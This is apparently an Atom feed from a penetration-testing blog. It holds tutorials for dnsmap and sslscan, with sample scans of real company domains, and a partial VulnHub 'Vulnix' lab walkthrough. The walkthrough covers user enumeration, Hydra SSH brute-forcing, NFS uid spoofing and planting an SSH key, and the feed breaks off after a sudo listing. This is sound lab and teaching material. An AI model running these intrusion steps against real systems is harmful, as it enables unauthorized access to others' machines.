<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: penetration testing | Core dump overflow]]></title>
  <link href="http://chousensha.github.io/blog/categories/penetration-testing/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2017-06-27T04:41:42-04:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[dnsmap - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/27/dnsmap-kali-linux-tools/"/>
    <updated>2017-06-27T04:12:46-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/27/dnsmap-kali-linux-tools</id>
    <content type="html"><![CDATA[<p>Today we&rsquo;ll explore another tool for DNS enumeration: the DNS Network Mapper (dnsmap). Although at the time of this post, its last update was in 2010, this tool has survived the passage of time, and has been packaged with versions of both Backtrack and Kali. There is quite a wealth of information about the tool on its homepage, and it comes with a built-in wordlist for domain bruteforcing.</p>

<p>Homepage: <a href="https://github.com/makefu/dnsmap">https://github.com/makefu/dnsmap</a></p>

<!-- more -->


<h2>dnsmap description</h2>

<blockquote><p>dnsmap was originally released back in 2006 and was inspired by the
fictional story &ldquo;The Thief No One Saw&rdquo; by Paul Craig, which can be found
in the book &ldquo;Stealing the Network &ndash; How to 0wn the Box&rdquo;</p>

<p>dnsmap is mainly meant to be used by pentesters during the information
gathering/enumeration phase of infrastructure security assessments. During the
enumeration stage, the security consultant would typically discover the target
company&rsquo;s IP netblocks, domain names, phone numbers, etc &hellip;</p>

<p>Subdomain brute-forcing is another technique that should be used in the
enumeration stage, as it&rsquo;s especially useful when other domain enumeration
techniques such as zone transfers don&rsquo;t work (I rarely see zone transfers
being <em>publicly</em> allowed these days by the way).</p>

<p>LIMITATIONS</p>

<p>Lack of multi-threading. This speed issue will hopefully be resolved in future versions.</p>

<p>FUN THINGS THAT CAN HAPPEN</p>

<ol>
<li><p>Finding interesting remote access servers (e.g.: <a href="https://extranet.targetdomain.com">https://extranet.targetdomain.com</a>)</p></li>
<li><p>Finding badly configured and/or unpatched servers (e.g.: test.targetdomain.com)</p></li>
<li><p>Finding new domain names which will allow you to map non-obvious/hard-to-find netblocks
of your target organization (registry lookups &ndash; aka whois is your friend)</p></li>
<li><p>Sometimes you find that some bruteforced subdomains resolve to internal IP addresses
(RFC 1918). This is great as sometimes they are real up-to-date &ldquo;A&rdquo; records which means
that it <em>is</em> possible to enumerate internal servers of a target organization from the
Internet by only using standard DNS resolving (as oppossed to zone transfers for instance).</p></li>
<li><p>Discover embedded devices configured using Dynamic DNS services (e.g.: linksys-cam.com).
This method is an alternative to finding devices via Google hacking techniques</p></li>
</ol>


<p>USAGE</p>

<p>Bruteforcing can be done either with dnsmap&rsquo;s built-in wordlist or a user-supplied wordlist.
Results can be saved in CSV and human-readable format for further processing. dnsmap does
NOT require root privileges to be run, and should NOT be run with such privileges for security reasons.</p></blockquote>

<h2>dnsmap options</h2>

<p>```
dnsmap 0.30 &ndash; DNS Network Mapper by pagvac (gnucitizen.org)</p>

<p>usage: dnsmap &lt;target-domain> [options]
options:
-w &lt;wordlist-file>
-r &lt;regular-results-file>
-c &lt;csv-results-file>
-d &lt;delay-millisecs>
-i &lt;ips-to-ignore> (useful if you&rsquo;re obtaining false positives)</p>

<p>e.g.:
dnsmap target-domain.foo
dnsmap target-domain.foo -w yourwordlist.txt -r /tmp/domainbf_results.txt
dnsmap target-fomain.foo -r /tmp/ -d 3000
dnsmap target-fomain.foo -r ./domainbf_results.txt
```</p>

<h2>dnsmap usage</h2>

<p>```
dnsmap slack.com
dnsmap 0.30 &ndash; DNS Network Mapper by pagvac (gnucitizen.org)</p>

<p>[+] warning: domain might use wildcards. 54.230.203.126 will be ignored from results
[+] searching (sub)domains for slack.com using built-in wordlist
[+] using maximum random delay of 10 millisecond(s) between requests</p>

<p>email.slack.com
IP address #1: 34.196.74.192
IP address #2: 54.88.163.82</p>

<p>files.slack.com
IP address #1: 52.85.178.60</p>

<p>qa.slack.com
IP address #1: 54.192.201.191</p>

<p>staging.slack.com
IP address #1: 52.87.251.252</p>

<p>upload.slack.com
IP address #1: 34.197.50.42
IP address #2: 52.22.100.1
IP address #3: 52.44.55.102
IP address #4: 52.54.239.215</p>

<p>[+] 5 (sub)domains and 9 IP address(es) found
[+] completion time: 122 second(s)
```</p>

<p>Here is how the output looks in the CSV format:</p>

<p><img class="center" src="/images/tools/dnsmap.png" title="&lsquo;dnsmap&rsquo; &lsquo;dnsmap CSV report&rsquo;" ></p>

<p>```</p>

<hr />

<p>/ In the stairway of life, you&rsquo;d best \
\ take the elevator.                  /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[sslscan - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/24/sslscan-kali-linux-tools/"/>
    <updated>2017-06-24T07:36:03-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/24/sslscan-kali-linux-tools</id>
    <content type="html"><![CDATA[<p><strong>Objective</strong>: you want to assess the SSL security posture of a target by listing the supported cipher suites. sslscan is a fast SSL/TLS scanner that has been extended from its original version, and at the time of this post, its last update was 2 days ago.</p>

<p>Homepage: <a href="https://github.com/rbsec/sslscan">https://github.com/rbsec/sslscan</a></p>

<!-- more -->


<h2>sslscan description</h2>

<blockquote><p>sslscan  queries SSL/TLS services, such as HTTPS, in order to determine the ciphers that are supported.</p>

<p>SSLScan is designed to be easy, lean and fast. The output includes preferred  ciphers of the SSL/TLS service, and
text and XML output formats are supported. It is TLS SNI aware when used with a  supported  version of OpenSSL.</p>

<p>Output is colour coded to indicate security issues. Colours are as follows:</p>

<p>Red Background:  NULL cipher (no encryption)</p>

<p>Red:             Broken cipher (&lt;= 40 bit), broken  protocol  (SSLv2  or SSLv3) or broken certificate signing
algorithm (MD5)</p>

<p>Yellow:           Weak  cipher  (&lt;=  56  bit or RC4) or weak certificate signing algorithm (SHA-1)</p>

<p>Purple:          Anonymous cipher (ADH or AECDH)</p></blockquote>

<p>Manpage: <a href="http://manpages.ubuntu.com/manpages/xenial/man1/sslscan.1.html">http://manpages.ubuntu.com/manpages/xenial/man1/sslscan.1.html</a></p>

<h2>sslscan options</h2>

<p>```</p>

<pre><code>       ___ ___| |___  ___ __ _ _ __
      / __/ __| / __|/ __/ _` | '_ \
      \__ \__ \ \__ \ (_| (_| | | | |
      |___/___/_|___/\___\__,_|_| |_|


    1.11.10-static
    OpenSSL 1.0.2-chacha (1.0.2g-dev)
</code></pre>

<p>Command:
  sslscan [Options] [host:port | host]</p>

<p>Options:
  &mdash;targets=<file>     A file containing a list of hosts to check.</p>

<pre><code>                   Hosts can  be supplied  with ports (host:port)
</code></pre>

<p>  &mdash;sni-name=<name>    Hostname for SNI
  &mdash;ipv4               Only use IPv4
  &mdash;ipv6               Only use IPv6
  &mdash;show-certificate   Show full certificate information
  &mdash;no-check-certificate  Don&rsquo;t warn about weak certificate algorithm or keys
  &mdash;show-client-cas    Show trusted CAs for TLS client auth
  &mdash;show-ciphers       Show supported client ciphers
  &mdash;show-cipher-ids    Show cipher ids
  &mdash;show-times         Show handhake times in milliseconds
  &mdash;ssl2               Only check SSLv2 ciphers
  &mdash;ssl3               Only check SSLv3 ciphers
  &mdash;tls10              Only check TLSv1.0 ciphers
  &mdash;tls11              Only check TLSv1.1 ciphers
  &mdash;tls12              Only check TLSv1.2 ciphers
  &mdash;tlsall             Only check TLS ciphers (all versions)
  &mdash;ocsp               Request OCSP response from server
  &mdash;pk=<file>          A file containing the private key or a PKCS#12 file</p>

<pre><code>                   containing a private key/certificate pair
</code></pre>

<p>  &mdash;pkpass=<password>  The password for the private  key or PKCS#12 file
  &mdash;certs=<file>       A file containing PEM/ASN1 formatted client certificates
  &mdash;no-ciphersuites    Do not check for supported ciphersuites
  &mdash;no-fallback        Do not check for TLS Fallback SCSV
  &mdash;no-renegotiation   Do not check for TLS renegotiation
  &mdash;no-compression     Do not check for TLS compression (CRIME)
  &mdash;no-heartbleed      Do not check for OpenSSL Heartbleed (CVE-2014-0160)
  &mdash;starttls-ftp       STARTTLS setup for FTP
  &mdash;starttls-imap      STARTTLS setup for IMAP
  &mdash;starttls-irc       STARTTLS setup for IRC
  &mdash;starttls-ldap      STARTTLS setup for LDAP
  &mdash;starttls-pop3      STARTTLS setup for POP3
  &mdash;starttls-smtp      STARTTLS setup for SMTP
  &mdash;starttls-mysql     STARTTLS setup for MYSQL
  &mdash;starttls-xmpp      STARTTLS setup for XMPP
  &mdash;starttls-psql      STARTTLS setup for PostgreSQL
  &mdash;xmpp-server        Use a server-to-server XMPP handshake
  &mdash;http               Test a HTTP connection
  &mdash;rdp                Send RDP preamble before starting scan
  &mdash;bugs               Enable SSL implementation bug work-arounds
  &mdash;timeout=<sec>      Set socket timeout. Default is 3s
  &mdash;sleep=<msec>       Pause between connection request. Default is disabled
  &mdash;xml=<file>         Output results to an XML file</p>

<pre><code>                   &lt;file&gt; can be -, which means stdout
</code></pre>

<p>  &mdash;version            Display the program version
  &mdash;verbose            Display verbose output
  &mdash;no-cipher-details  Disable EC curve names and EDH/RSA key lengths output
  &mdash;no-colour          Disable coloured output
  &mdash;help               Display the  help text  you are  now reading</p>

<p>Example:
  sslscan 127.0.0.1
  sslscan [::1]
```</p>

<h2>sslscan usage</h2>

<p>```
sslscan <a href="https://www.cylance.com">https://www.cylance.com</a>
Version: 1.11.10-static
OpenSSL 1.0.2-chacha (1.0.2g-dev)</p>

<p>Testing SSL server www.cylance.com on port 443 using SNI name www.cylance.com</p>

<p>  TLS Fallback SCSV:
Server supports TLS Fallback SCSV</p>

<p>  TLS renegotiation:
Secure session renegotiation supported</p>

<p>  TLS Compression:
Compression disabled</p>

<p>  Heartbleed:
TLS 1.2 not vulnerable to heartbleed
TLS 1.1 not vulnerable to heartbleed
TLS 1.0 not vulnerable to heartbleed</p>

<p>  Supported Server Cipher(s):
Preferred TLSv1.2  128 bits  ECDHE-RSA-AES128-GCM-SHA256   Curve P-256 DHE 256
Accepted  TLSv1.2  128 bits  ECDHE-RSA-AES128-SHA256       Curve P-256 DHE 256
Accepted  TLSv1.2  128 bits  ECDHE-RSA-AES128-SHA          Curve P-256 DHE 256
Accepted  TLSv1.2  256 bits  ECDHE-RSA-AES256-GCM-SHA384   Curve P-256 DHE 256
Accepted  TLSv1.2  256 bits  ECDHE-RSA-AES256-SHA384       Curve P-256 DHE 256
Accepted  TLSv1.2  256 bits  ECDHE-RSA-AES256-SHA          Curve P-256 DHE 256
Accepted  TLSv1.2  128 bits  AES128-GCM-SHA256          <br/>
Accepted  TLSv1.2  128 bits  AES128-SHA256              <br/>
Accepted  TLSv1.2  128 bits  AES128-SHA                 <br/>
Accepted  TLSv1.2  256 bits  AES256-GCM-SHA384          <br/>
Accepted  TLSv1.2  256 bits  AES256-SHA256              <br/>
Accepted  TLSv1.2  256 bits  AES256-SHA                 <br/>
Accepted  TLSv1.2  112 bits  DES-CBC3-SHA               <br/>
Preferred TLSv1.1  128 bits  ECDHE-RSA-AES128-SHA          Curve P-256 DHE 256
Accepted  TLSv1.1  256 bits  ECDHE-RSA-AES256-SHA          Curve P-256 DHE 256
Accepted  TLSv1.1  128 bits  AES128-SHA                 <br/>
Accepted  TLSv1.1  256 bits  AES256-SHA                 <br/>
Accepted  TLSv1.1  112 bits  DES-CBC3-SHA               <br/>
Preferred TLSv1.0  128 bits  ECDHE-RSA-AES128-SHA          Curve P-256 DHE 256
Accepted  TLSv1.0  256 bits  ECDHE-RSA-AES256-SHA          Curve P-256 DHE 256
Accepted  TLSv1.0  128 bits  AES128-SHA                 <br/>
Accepted  TLSv1.0  256 bits  AES256-SHA                 <br/>
Accepted  TLSv1.0  112 bits  DES-CBC3-SHA</p>

<p>  SSL Certificate:
Signature Algorithm: sha256WithRSAEncryption
RSA Key Strength:    2048</p>

<p>Subject:  <em>.cylance.com
Altnames: DNS:</em>.cylance.com, DNS:cylance.com, DNS:www.cylance.com, DNS:info.cylance.com, DNS:blog.cylance.com, DNS:education.cylance.com, DNS:support.cylance.com
Issuer:   DigiCert SHA2 Secure Server CA</p>

<p>Not valid before: May 24 00:00:00 2017 GMT
Not valid after:  May 29 12:00:00 2018 GMT
```</p>

<p>```</p>

<hr />

<p>/ Q: Do you know what the death rate \
\ around here is? A: One per person. /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[HackLAB Vulnix]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/20/hacklab-vulnix/"/>
    <updated>2017-06-20T08:04:29-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/20/hacklab-vulnix</id>
    <content type="html"><![CDATA[<p>Vulnix is an older machine from VulnHub that intends to present vulnerabilities from a misconfiguration point of view. The goal is to get the flag inside /root</p>

<!-- more -->


<p>Here are the Nmap results:</p>

<p><code>
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
25/tcp    open  smtp       Postfix smtpd
79/tcp    open  finger     Linux fingerd
110/tcp   open  pop3?
111/tcp   open  rpcbind    2-4 (RPC #100000)
143/tcp   open  imap       Dovecot imapd
512/tcp   open  exec       netkit-rsh rexecd
513/tcp   open  login
514/tcp   open  tcpwrapped
993/tcp   open  ssl/imap   Dovecot imapd
995/tcp   open  ssl/pop3s?
2049/tcp  open  nfs_acl    2-3 (RPC #100227)
36190/tcp open  status     1 (RPC #100024)
40731/tcp open  mountd     1-3 (RPC #100005)
43539/tcp open  nlockmgr   1-4 (RPC #100021)
46423/tcp open  mountd     1-3 (RPC #100005)
52024/tcp open  mountd     1-3 (RPC #100005)
</code></p>

<h3>finger user enumeration</h3>

<p>There are quite a few services listening on the host. One of the first things that grabbed my attention was finger running on port 79. Because of this, we can use finger to perform <a href="https://pentestlab.blog/tag/finger/">user enumeration</a> on the host. We can use Nmap&rsquo;s script scan to see who is logged on the host, or do it manually. Here I will show the manual way:</p>

<p><code>
finger @192.168.217.142
No one logged on.
</code></p>

<p>The same thing can be achieved by running Nmap with the <em>-sC</em> flag. Next I tried to get more information about the root user:</p>

<p><code>
finger root@192.168.217.142
Login: root                     Name: root
Directory: /root                        Shell: /bin/bash
Never logged in.
No mail.
No Plan.
</code></p>

<p>It seems the root user never logged in, but we still obtained the directory and shell that root uses. I tried a few more guesses and discovered a couple more users on the host:</p>

<p>```
finger <a href="&#x6d;&#x61;&#105;&#108;&#116;&#x6f;&#x3a;&#x75;&#x73;&#101;&#114;&#x40;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#x2e;&#50;&#x31;&#x37;&#x2e;&#49;&#x34;&#x32;">&#x75;&#x73;&#x65;&#x72;&#64;&#49;&#x39;&#x32;&#46;&#49;&#54;&#x38;&#46;&#50;&#x31;&#x37;&#46;&#49;&#x34;&#x32;</a>
Login: user                     Name: user
Directory: /home/user                   Shell: /bin/bash
Never logged in.
No mail.
No Plan.</p>

<p>Login: dovenull                 Name: Dovecot login user
Directory: /nonexistent                 Shell: /bin/false
Never logged in.
No mail.
No Plan.</p>

<p>finger <a href="&#x6d;&#97;&#105;&#108;&#x74;&#x6f;&#x3a;&#118;&#x75;&#108;&#x6e;&#105;&#120;&#64;&#x31;&#57;&#50;&#46;&#x31;&#54;&#x38;&#46;&#x32;&#x31;&#55;&#x2e;&#49;&#52;&#x32;">&#118;&#x75;&#108;&#110;&#x69;&#120;&#x40;&#49;&#57;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#50;&#49;&#x37;&#46;&#x31;&#52;&#x32;</a>
Login: vulnix                   Name:
Directory: /home/vulnix                 Shell: /bin/bash
Never logged in.
No mail.
No Plan.
```</p>

<h3>SMTP user enumeration</h3>

<p>Since port 25 is open, we can also attempt some enumeration with SMTP. Again, this can be accomplished with an Nmap script, but this time I want to use an utility called <strong>smtp-user-enum</strong>.</p>

<p>Homepage: <a href="http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum">http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum</a></p>

<blockquote><p>smtp-user-enum is a tool for enumerating OS-level user accounts on Solaris via the SMTP service (sendmail).
Enumeration is performed by inspecting the responses to VRFY, EXPN and RCPT TO commands. It could be adapted to
work against other vulnerable SMTP daemons, but this hasn’t been done as of v1.0.</p></blockquote>

<p>Let&rsquo;s see its options:</p>

<p>```
smtp-user-enum v1.2 ( <a href="http://pentestmonkey.net/tools/smtp-user-enum">http://pentestmonkey.net/tools/smtp-user-enum</a> )</p>

<p>Usage: smtp-user-enum.pl [options] ( -u username | -U file-of-usernames ) ( -t host | -T file-of-targets )</p>

<p>options are:</p>

<pre><code>    -m n     Maximum number of processes (default: 5)
-M mode  Method to use for username guessing EXPN, VRFY or RCPT (default: VRFY)
-u user  Check if user exists on remote system
-f addr  MAIL FROM email address.  Used only in "RCPT TO" mode (default: user@example.com)
    -D dom   Domain to append to supplied user list to make email addresses (Default: none)
             Use this option when you want to guess valid email addresses instead of just usernames
             e.g. "-D example.com" would guess foo@example.com, bar@example.com, etc.  Instead of 
                  simply the usernames foo and bar.
-U file  File of usernames to check via smtp service
-t host  Server host running smtp service
-T file  File of hostnames running the smtp service
-p port  TCP port on which smtp service runs (default: 25)
-d       Debugging output
-t n     Wait a maximum of n seconds for reply (default: 5)
-v       Verbose
-h       This help message
</code></pre>

<p>Also see smtp-user-enum-user-docs.pdf from the smtp-user-enum tar ball.</p>

<p>Examples:</p>

<p>$ smtp-user-enum.pl -M VRFY -U users.txt -t 10.0.0.1
$ smtp-user-enum.pl -M EXPN -u admin1 -t 10.0.0.1
$ smtp-user-enum.pl -M RCPT -U users.txt -T mail-server-ips.txt
$ smtp-user-enum.pl -M EXPN -D example.com -U users.txt -t 10.0.0.1
```</p>

<p>I created a file named users.txt with some usernames to try, and fed it to the script:</p>

<p>```
root@kali:~# smtp-user-enum -U users.txt -t 192.168.217.142
Starting smtp-user-enum v1.2 ( <a href="http://pentestmonkey.net/tools/smtp-user-enum">http://pentestmonkey.net/tools/smtp-user-enum</a> )</p>

<hr />



<hr />

<p>Mode &hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip; VRFY
Worker Processes &hellip;&hellip;&hellip; 5
Usernames file &hellip;&hellip;&hellip;.. users.txt
Target count &hellip;&hellip;&hellip;&hellip;. 1
Username count &hellip;&hellip;&hellip;.. 6
Target TCP port &hellip;&hellip;&hellip;. 25
Query timeout &hellip;&hellip;&hellip;&hellip; 5 secs
Target domain &hellip;&hellip;&hellip;&hellip;</p>

<h6>## Scan started at Tue Jun 20 09:29:30 2017</h6>

<p>192.168.217.142: root exists
192.168.217.142: vulnix exists
192.168.217.142: user exists
192.168.217.142: postmaster exists
192.168.217.142: mail exists</p>

<h6>## Scan completed at Tue Jun 20 09:29:30 2017</h6>

<p>5 results.</p>

<p>6 queries in 1 seconds (6.0 queries / sec)
```</p>

<p>You can see that this is a pretty cool script that can help you enumerate users pretty fast, and now we know more valid user accounts on the system. You can also use it to find valid email addresses instead of accounts, by using the <em>-D</em> option. I tried a few examples, but got no hits.</p>

<p>Moving on, ports 512-514 are fore the old r-utilities, and if misconfigured, could allow remote access to the host. But in this case, the system asked me for root&rsquo;s SSH password, so I couldn&rsquo;t exploit them.</p>

<h3>Exploit NFS</h3>

<p>We&rsquo;ve done some preliminary enumeration on the target, now it&rsquo;s time to return to the results of the Nmap scan. We&rsquo;ve identified the fact that NFS is running on the Vulnix host. I confirmed it with the use of <em>rpcinfo</em>:</p>

<p>```
rpcinfo -p 192.168.217.142
   program vers proto   port  service</p>

<pre><code>100000    4   tcp    111  portmapper
100000    3   tcp    111  portmapper
100000    2   tcp    111  portmapper
100000    4   udp    111  portmapper
100000    3   udp    111  portmapper
100000    2   udp    111  portmapper
100024    1   udp  39427  status
100024    1   tcp  42309  status
100003    2   tcp   2049  nfs
100003    3   tcp   2049  nfs
100003    4   tcp   2049  nfs
100227    2   tcp   2049
100227    3   tcp   2049
100003    2   udp   2049  nfs
100003    3   udp   2049  nfs
100003    4   udp   2049  nfs
100227    2   udp   2049
100227    3   udp   2049
100021    1   udp  39258  nlockmgr
100021    3   udp  39258  nlockmgr
100021    4   udp  39258  nlockmgr
100021    1   tcp  34418  nlockmgr
100021    3   tcp  34418  nlockmgr
100021    4   tcp  34418  nlockmgr
100005    1   udp  34638  mountd
100005    1   tcp  52581  mountd
100005    2   udp  42603  mountd
100005    2   tcp  53226  mountd
100005    3   udp  49704  mountd
100005    3   tcp  47770  mountd
</code></pre>

<p>```</p>

<p>If NFS wasn&rsquo;t properly configured, we might have access to shares we wouldn&rsquo;t otherwise be allowed to. There are a couple of ways to list the shares, and I&rsquo;m going to show here some of them. Th easiest way is from the command line, with the <code>showmount -e</code> command:</p>

<p><code>
root@kali:~# showmount -e 192.168.217.142
Export list for 192.168.217.142:
/home/vulnix *
</code></p>

<p>Good news! The vulnix home directory is being shared with no restrictions. Before going there, let&rsquo;s see how we can get the same information with Nmap:</p>

<p>```
nmap -sV -p111 &mdash;script=nfs-showmount 192.168.217.142</p>

<p>Starting Nmap 7.40 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2017-06-21 06:00 EDT
Nmap scan report for 192.168.217.142
Host is up (0.00027s latency).
PORT    STATE SERVICE VERSION
111/tcp open  rpcbind 2-4 (RPC #100000)
| nfs-showmount:
|<em>  /home/vulnix *
| rpcinfo:
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      47770/tcp  mountd
|   100005  1,2,3      49704/udp  mountd
|   100021  1,3,4      34418/tcp  nlockmgr
|   100021  1,3,4      39258/udp  nlockmgr
|   100024  1          39427/udp  status
|   100024  1          42309/tcp  status
|   100227  2,3         2049/tcp  nfs_acl
|</em>  100227  2,3         2049/udp  nfs_acl
```</p>

<p>We can also use the <em>auxiliary/scanner/nfs/nfsmount</em> Metasploit module:</p>

<p>```
msf auxiliary(nfsmount) > run</p>

<p>[+] 192.168.217.142:111   &ndash; 192.168.217.142 NFS Export: /home/vulnix [<em>]
[</em>] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```</p>

<p>I mounted the share locally to see what&rsquo;s there. The <em>nolock</em> option disables file locking and it&rsquo;s sometimes required for older NFS servers.</p>

<p><code>
root@kali:/mnt# mkdir nfs
root@kali:/mnt# mount -t nfs -o nolock 192.168.217.142:/home/vulnix /mnt/nfs
</code></p>

<p>However, when I tried to access the newly mounted share, I got permission denied errors. I couldn&rsquo;t <em>chmod</em> or do anything else. After some reading on the interwebz, it seems the likely cause is the <a href="https://www.centos.org/docs/5/html/Deployment_Guide-en-US/s1-nfs-server-config-exports.html">root_squash</a> option, that nullifies the root privileges of the clients accessing the share, and instead gives them the user ID of the nobody user. It seems to be enabled by default on modern NFS implementations, and you can read more about it <a href="http://www.techrepublic.com/article/working-with-nfs/">here</a>.</p>

<p>After some more digging through the interwebz, I found an <a href="https://www.pentestpartners.com/security-blog/using-nfsshell-to-compromise-older-environments/">interesting article about nfsshell</a>, which is a userspace NFS client shell. I downloaded it from its <a href="https://github.com/NetDirect/nfsshell">Github page</a>, and to compile I had to install the following <a href="https://www.phillips321.co.uk/2015/09/15/nfsshell-on-kali-linux-2-0/">dependencies</a>: <code>apt-get install libreadline-dev libncurses5-dev</code>. Afterwards, I ran <em>make</em> and it compiled fine. Here are its options:</p>

<p><code>
nfs&gt; help
host &lt;host&gt; - set remote host name
uid [&lt;uid&gt; [&lt;secret-key&gt;]] - set remote user id
gid [&lt;gid&gt;] - set remote group id
cd [&lt;path&gt;] - change remote working directory
lcd [&lt;path&gt;] - change local working directory
cat &lt;filespec&gt; - display remote file
ls [-l] &lt;filespec&gt; - list remote directory
get &lt;filespec&gt; - get remote files
df - file system information
rm &lt;file&gt; - delete remote file
ln &lt;file1&gt; &lt;file2&gt; - link file
mv &lt;file1&gt; &lt;file2&gt; - move file
mkdir &lt;dir&gt; - make remote directory
rmdir &lt;dir&gt; - remove remote directory
chmod &lt;mode&gt; &lt;file&gt; - change mode
chown &lt;uid&gt;[.&lt;gid&gt;] &lt;file&gt; -  change owner
put &lt;local-file&gt; [&lt;remote-file&gt;] - put file
mount [-upTU] [-P port] &lt;path&gt; - mount file system
umount - umount remote file system
umountall - umount all remote file systems
export - show all exported file systems
dump - show all remote mounted file systems
status - general status report
help - this help message
quit - its all in the name
bye - good bye
handle [&lt;handle&gt;] - get/set directory file handle
mknod &lt;name&gt; [b/c major minor] [p] - make device
</code></p>

<p>From my reading about NFS and root squashing, it seems that knowing the uid of the share&rsquo;s owner would allow mounting the share as that user and bypassing the access denied errors that I got as root. Because the share is the home folder of the vulnix user, we need to know the uid for that particular user account. But we need local access to the machine to find that out. Well, we did get some usernames from the enumeration stage, so we probably have to attempt a bruteforce attack. From all the discovered usernames, I only kept the user and vulnix ones, because the rest were users for various services on the system. And then I ran Hydra with the recommended task number for SSH:</p>

<p><img class="center" src="/images/pentest/vulnix-hydra.png" title="&lsquo;hydra&rsquo; &lsquo;letmein&rsquo;" ></p>

<p>Hydra found the password for user pretty quickly. I logged in as user, but didn&rsquo;t find anything out of the ordinary. However, I was able to get the uid for the vulnix account:</p>

<p><code>
user@vulnix:~$ id vulnix
uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)
</code></p>

<p>I went back to nfsshell and made the changes:</p>

<p><code>
nfs&gt; host 192.168.217.142
Using a privileged port (1023)
Open 192.168.217.142 (192.168.217.142) TCP
nfs&gt; uid 2008
nfs&gt; gid 2008
nfs&gt; status
User id      : 2008
Group id     : 2008
Remote host  : `192.168.217.142'
Transfer size: 0
</code></p>

<p>Now I was able to access the share:</p>

<p><code>
nfs&gt; ls -l
drwxr-x---  2     2008  2008      4096  Sep  2  2012  .
drwxr-x---  2     2008  2008      4096  Sep  2  2012  ..
drwxr-x---  2     2008  2008      4096  Sep  2  2012  .bash_logout
drwxr-x---  2     2008  2008      4096  Sep  2  2012  .bashrc
drwxr-x---  2     2008  2008      4096  Sep  2  2012  .profile
</code></p>

<p>Since this is vulnix&rsquo;s home directory, we can put an SSH key in here to allow remote access. I tried the next steps through nfsshell, but I was limited in the commands I could run. So I created a local vulnix user on my machine, and assigned it the uid 2008: <code>root@kali:~# useradd vulnix -u 2008</code>. Then I generated an SSH key pair from this account:</p>

<p><code>
root@kali:~# su vulnix
$ id
uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)
$ cd /tmp
$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/vulnix/.ssh/id_rsa): vulnix
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in vulnix.
Your public key has been saved in vulnix.pub.
The key fingerprint is:
SHA256:P6FAPt9R/0TbOTtQUhk8SiBUlgAtINciO0mUmr2Nrp4 vulnix@kali
The key's randomart image is:
+---[RSA 2048]----+
|  .o.oo.++o+o .oo|
|   +o. o .o. ..+ |
|  = + o .   o...o|
| o = o     . oo.+|
|    = + S o  ..+o|
|   o . + + o  .oo|
|  .     o +    o.|
|  ..       .    .|
|.E.              |
+----[SHA256]-----+
</code></p>

<p>I now navigated without problems to the NFS share, created a .ssh directory and copied the contents of the public key to <em>authorized_keys</em>:</p>

<p><code>
$ cat /tmp/vulnix.pub &gt; .ssh/authorized_keys
$ cat .ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuO5LOA1EIJeaFJHHic7NRNIUvOhBApq7CSu7PAM/THU4hngoZ4kglgFC9QdbsfQsRWLHsDmNcAAGLzIKwkLYXWYanBK/7xdmRmtGf0Sr32zZ4NaXP9B228fjUu5LSi42X/9HcfL9QdfXuB336OvXo43sDzLifrzoiBzlviZV55+uVd+/hI0GCRE3Yi9JrLs1A6NhuHq8xtRLJURhuGwoouA2tGZ+6fSr7t23bC1emBnyUiy2hu/4oS9tLvvptPv1Md9E+Ire6XMjZzCJufcSqiMVrVefnWv5j460TjHhKP7aq23nbzlxMqkZ8r9ovm5KW0UWWWyVPkOFSxPgFEaRr vulnix@kali
</code></p>

<p>And I was able to login with the key: <code>ssh -i /tmp/vulnix <a href="&#109;&#97;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#x76;&#x75;&#x6c;&#x6e;&#x69;&#120;&#64;&#49;&#x39;&#x32;&#46;&#x31;&#54;&#56;&#x2e;&#50;&#x31;&#x37;&#46;&#49;&#x34;&#x32;">&#118;&#117;&#x6c;&#x6e;&#x69;&#120;&#64;&#49;&#57;&#x32;&#x2e;&#x31;&#54;&#x38;&#x2e;&#x32;&#x31;&#x37;&#46;&#x31;&#52;&#50;</a></code>. After some enumeration, I discovered that the vulnix user can edit <code>/etc/exports</code> with sudo privileges:</p>

<p>```
vulnix@vulnix:~$ sudo -l
Matching &lsquo;Defaults&rsquo; entries for vulnix on this host:</p>

<pre><code>env_reset,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
</code></pre>

<p>User vulnix may run the following commands on this host:</p>

<pre><code>(root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports
</code></pre>

<p>```</p>

